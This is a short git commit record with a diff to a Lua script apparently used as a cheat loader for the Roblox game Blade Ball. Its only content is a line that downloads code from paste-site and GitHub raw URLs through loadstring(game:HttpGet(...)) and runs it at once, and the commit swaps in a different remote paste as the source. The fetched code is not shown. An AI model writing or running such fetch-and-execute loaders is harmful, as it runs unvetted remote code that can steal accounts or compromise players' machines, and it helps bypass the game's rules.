113cdfb1b698c2b8bb3a9b69e3c12bf10aa60632
Scriptsnet <maramarajadematthew@gmail.com>
2026-03-22 11:26:00 +0800

    Update script URLs in Argon-Hub-X-BladeBall-OP.lua

--- Argon-Hub-X-BladeBall-OP.lua
+++ Argon-Hub-X-BladeBall-OP.lua
@@ -1,1 +1,1 @@
-task.spawn(function()loadstring(game:HttpGet("https://pastefy.app/15gJEM25/raw"))()end)loadstring(game:HttpGet("https://raw.githubusercontent.com/navi-hub-net/Scripts/refs/heads/main/NaviHubSource.lua"))()
+task.spawn(function()loadstring(game:HttpGet("https://pastefy.app/15gJEM25/raw"))()end)loadstring(game:HttpGet("https://pastefy.app/5OK8XFAQ/raw"))()
